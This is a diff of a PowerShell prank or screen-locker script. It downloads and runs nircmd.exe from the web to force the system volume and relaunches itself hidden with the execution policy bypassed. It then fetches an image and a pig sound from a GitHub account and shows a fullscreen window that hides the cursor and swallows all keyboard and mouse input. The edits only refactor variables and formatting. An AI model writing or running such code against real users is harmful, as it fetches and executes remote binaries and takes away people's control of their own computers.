@@ -1,29 +1,26 @@
-$level = 50
-$val = [int]([math]::Round(65535 * ($level / 100)))
-$temp = Join-Path $env:TEMP "nircmd.zip"
-$exe = Join-Path $env:TEMP "nircmd.exe"
-if (-not (Test-Path $exe)) {
-    Invoke-WebRequest -Uri "https://www.nirsoft.net/utils/nircmd.zip" -OutFile $temp -UseBasicParsing
+$Url = "https://github.com/halololcloud/images/blob/main/borov.jpg?raw=true"
+$Audio = "https://github.com/halololcloud/images/raw/refs/heads/main/pig.mp3"
+$VolumeLevel = 50
+
+$val = [int]([math]::Round(65535 * ($VolumeLevel / 100)))
+$tempNir = Join-Path $env:TEMP "nircmd.exe"
+if (-not (Test-Path $tempNir)) {
+    $tempZip = Join-Path $env:TEMP "nircmd.zip"
+    Invoke-WebRequest -Uri "https://www.nirsoft.net/utils/nircmd.zip" -OutFile $tempZip -UseBasicParsing
     Add-Type -AssemblyName System.IO.Compression.FileSystem
-    [System.IO.Compression.ZipFile]::ExtractToDirectory($temp, $env:TEMP)
-    Remove-Item $temp -ErrorAction SilentlyContinue
+    [System.IO.Compression.ZipFile]::ExtractToDirectory($tempZip, $env:TEMP)
+    Remove-Item $tempZip -ErrorAction SilentlyContinue
 }
-Start-Process -FilePath $exe -ArgumentList "setsysvolume $val" -NoNewWindow -Wait
-
-
-param(
-    [string]$Url = "https://github.com/halololcloud/images/blob/main/borov.jpg?raw=true",
-    [string]$Audio = "https://github.com/halololcloud/images/raw/refs/heads/main/pig.mp3"
-)
+Start-Process -FilePath $tempNir -ArgumentList "setsysvolume $val" -NoNewWindow -Wait
 
 if ([System.Threading.Thread]::CurrentThread.ApartmentState -ne 'STA') {
-    Start-Process powershell.exe -ArgumentList "-NoProfile -STA -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`" -Url `"$Url`" -Audio `"$Audio`"" -WindowStyle Hidden -Wait
+    Start-Process powershell.exe -ArgumentList "-NoProfile -STA -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -WindowStyle Hidden -Wait
     exit
 }
 
 Add-Type -AssemblyName PresentationCore,PresentationFramework,WindowsBase
-$tempImg = [IO.Path]::Combine($env:TEMP, "fullscreen_image.jpg")
-$tempAudio = [IO.Path]::Combine($env:TEMP, "temp_audio.mp3")
+$tempImg = Join-Path $env:TEMP "fullscreen_image.jpg"
+$tempAudio = Join-Path $env:TEMP "temp_audio.mp3"
 Invoke-WebRequest -Uri $Url -OutFile $tempImg -UseBasicParsing
 Invoke-WebRequest -Uri $Audio -OutFile $tempAudio -UseBasicParsing
 
@@ -56,10 +53,7 @@ $w.Content = $img
 $w.Cursor = [System.Windows.Input.Cursors]::None
 $w.ShowInTaskbar = $false
 
-$block = {
-    param($s,$e)
-    $e.Handled = $true
-}
+$block = { param($s,$e) $e.Handled = $true }
 $w.Add_PreviewKeyDown($block)
 $w.Add_PreviewKeyUp($block)
 $w.Add_PreviewTextInput($block)
@@ -68,9 +62,8 @@ $w.Add_PreviewMouseUp($block)
 $w.Add_PreviewMouseMove($block)
 $w.Add_PreviewMouseWheel($block)
 
-try {
-    $w.ShowDialog() | Out-Null
-} finally {
+try { $w.ShowDialog() | Out-Null }
+finally {
     $wmp.controls.stop()
     $wmp.close()
     Remove-Item -Path $tempImg,$tempAudio -ErrorAction SilentlyContinue
